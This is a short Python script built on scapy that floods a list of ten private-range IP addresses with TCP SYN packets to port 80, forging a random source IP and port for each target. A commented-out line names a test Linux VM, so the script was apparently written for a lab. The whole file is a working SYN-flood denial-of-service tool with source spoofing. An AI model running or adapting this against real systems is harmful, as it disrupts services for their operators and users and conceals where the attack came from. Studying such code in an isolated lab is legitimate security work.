from scapy.all import *
import random

# 10 target IPs
target_ips = ["192.168.1.240", "192.168.1.241", "192.168.1.242", 
              "192.168.1.243", "192.168.1.244", "192.168.1.245", 
              "192.168.1.246", "192.168.1.247", "192.168.1.248", 
              "172.16.4.249"]
#test target linux VM
#target_ips = ["172.16.4.132"]

# Random IP generator
def random_IP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

# Random port generator
def random_port():
    port = random.randint(1024, 65535)
    return port

# Spoof Source
def spoof_source():
    spoof_ip = random_IP()
    spoof_port = random_port()
    return spoof_ip, spoof_port
   
#scapy flood
for ip in target_ips:
    spoof_ip, spoof_port = spoof_source()
    for i in range(100):
        packet = IP(src=spoof_ip, dst=ip) / TCP(sport=spoof_port, dport=80, flags='S')
        send(packet, verbose=0)